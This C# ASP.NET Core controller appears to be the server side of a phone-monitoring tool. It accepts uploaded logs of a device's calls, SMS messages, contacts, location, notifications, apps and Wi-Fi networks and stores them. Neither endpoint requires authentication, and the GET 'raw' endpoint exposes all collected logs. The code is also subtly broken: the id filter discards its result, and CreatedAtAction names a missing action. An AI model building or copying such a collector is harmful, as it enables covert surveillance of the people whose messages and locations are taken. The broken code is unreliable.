using server.Db;
using server.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace server.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class LogController : ControllerBase
    {
        public LogController(LogContext logContext)
        {
            this.logContext = logContext;
        }

        LogContext logContext = null;

        [HttpPost]
        public IActionResult Log([FromBody]object request)
        {
            switch (JsonConvert.DeserializeObject<LogBase>(request.ToString()).Type)
            {
                case LogType.app:
                    foreach (var app in JsonConvert.DeserializeObject<Log<List<App>>>(request.ToString()).Value)
                    {
                        logContext.App.Add(app);
                    }
                    break;
                case LogType.call:
                    foreach (var call in JsonConvert.DeserializeObject<Log<List<Call>>>(request.ToString()).Value)
                    {
                        logContext.Call.Add(call);
                    }
                    break;
                case LogType.contact:
                    foreach (var contact in JsonConvert.DeserializeObject<Log<List<Contact>>>(request.ToString()).Value)
                    {
                        logContext.Contact.Add(contact);
                    }
                    break;
                case LogType.location:
                    logContext.Location.Add(JsonConvert.DeserializeObject<Log<Location>>(request.ToString()).Value);
                    break;
                case LogType.notification:
                    logContext.Notification.Add(JsonConvert.DeserializeObject<Log<Notification>>(request.ToString()).Value);
                    break;
                case LogType.sms:
                    foreach (var sms in JsonConvert.DeserializeObject<Log<List<Sms>>>(request.ToString()).Value)
                    {
                        logContext.Sms.Add(sms);
                    }
                    break;
                case LogType.wifi:
                    foreach (var wifi in JsonConvert.DeserializeObject<Log<List<Wifi>>>(request.ToString()).Value)
                    {
                        logContext.Wifi.Add(wifi);
                    }
                    break;
            }

            var raw = new RawLog
            {
                Value = request.ToString()
            };

            logContext.Raw.Add(raw);

            logContext.SaveChanges();

            return CreatedAtAction("Post", raw.Id);
        }

        [HttpGet("raw")]
        public IActionResult Raw(Guid? id)
        {
            var result = logContext.Raw.AsQueryable();

            if (id != null)
            {
                result.FirstOrDefault(x => x.Id == id);
            }

            return Ok(result.ToList());
        }
    }
}
